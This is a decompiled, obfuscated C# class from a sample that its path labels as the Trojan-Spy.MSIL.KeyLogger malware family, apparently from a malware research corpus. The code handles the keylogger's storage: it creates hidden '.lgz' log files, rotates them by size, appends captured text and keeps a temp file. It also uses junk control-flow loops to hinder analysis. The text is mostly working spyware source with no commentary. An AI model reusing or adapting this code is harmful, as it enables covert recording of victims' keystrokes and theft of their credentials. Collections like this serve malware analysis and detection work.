// Decompiled with JetBrains decompiler
// Type: ៪
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;
using System;
using System.IO;

internal class \u17EA
{
  private const int ᡆᙃ = 50000;
  private const string ᡇᙃ = "\\KeyLog_";
  private const string ᡈᙃ = ".lgz";
  private string ᡉᙃ;
  private អ ᡊᙃ;

  public \u17EA()
  {
    do
      ;
    while (false);
    this.ᡊᙃ = new អ();
    // ISSUE: explicit constructor call
    base.\u002Ector();
    try
    {
      if (!Directory.Exists(Settings.Default.ArchivingKeyloggerLocation))
        Directory.CreateDirectory(Settings.Default.ArchivingKeyloggerLocation);
      this.ᡉᙃ = this.\u17EE();
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public string \u17EC(int n)
  {
    do
      ;
    while (false);
    string path = Settings.Default.ArchivingKeyloggerLocation + "\\KeyLog_" + n.ToString() + ".lgz";
    if (!File.Exists(path))
    {
      try
      {
        File.Create(path).Close();
        if (File.Exists(path))
          File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        this.ᡊᙃ.ឨ(ex);
      }
    }
    return path;
  }

  public bool \u17F0()
  {
    do
      ;
    while (false);
    bool flag;
    try
    {
      flag = new FileInfo(this.ᡉᙃ).Length < 50000L;
      goto label_4;
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    return true;
label_4:
    return flag;
  }

  public void \u1804(string txt)
  {
    do
      ;
    while (false);
    try
    {
      if (!Directory.Exists(Settings.Default.TempFileLocation))
        Directory.CreateDirectory(Settings.Default.TempFileLocation);
      File.WriteAllText(Settings.Default.TempFileLocation + "\\Temp.txt", txt);
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public string \u17F2()
  {
    do
      ;
    while (false);
    string str;
    try
    {
      if (File.Exists(Settings.Default.TempFileLocation + "\\Temp.txt"))
      {
        str = File.ReadAllText(Settings.Default.TempFileLocation + "\\Temp.txt");
        goto label_5;
      }
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    return "";
label_5:
    return str;
  }

  public void ᙔ(string txt)
  {
    do
      ;
    while (false);
    try
    {
      if (this.\u17F0() && File.Exists(this.ᡉᙃ))
      {
        using (StreamWriter streamWriter = File.AppendText(this.ᡉᙃ))
          streamWriter.Write(txt);
      }
      else
      {
        string[] strArray = this.ᡉᙃ.Split('_');
        int n = int.Parse(strArray[strArray.Length - 1].Split('.')[0]) + 1;
        if (File.Exists(this.ᡉᙃ))
          ᡔ.ᡀ(this.ᡉᙃ);
        this.ᡉᙃ = this.\u17EC(n);
        if (File.Exists(this.ᡉᙃ))
        {
          using (StreamWriter streamWriter = File.AppendText(this.ᡉᙃ))
            streamWriter.Write(txt);
        }
      }
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public string \u17EE()
  {
    do
      ;
    while (false);
    string str1 = "";
    string str2;
    try
    {
      FileInfo[] files = new DirectoryInfo(Settings.Default.ArchivingKeyloggerLocation).GetFiles("*.lgz", SearchOption.TopDirectoryOnly);
      if (files.Length == 0)
      {
        str2 = this.\u17EC(0);
        goto label_13;
      }
      else
      {
        foreach (FileInfo fileInfo in files)
        {
          if (str1.Equals(""))
          {
            str1 = fileInfo.FullName;
          }
          else
          {
            string[] strArray1 = str1.Split('_');
            string[] strArray2 = strArray1[strArray1.Length - 1].Split('.');
            string[] strArray3 = fileInfo.FullName.Split('_');
            string[] strArray4 = strArray3[strArray3.Length - 1].Split('.');
            if (int.Parse(strArray2[0]) < int.Parse(strArray4[0]))
              str1 = fileInfo.FullName;
          }
        }
      }
    }
    catch (Exception ex)
    {
      this.ᡊᙃ.ឨ(ex);
    }
    return str1;
label_13:
    return str2;
  }
}
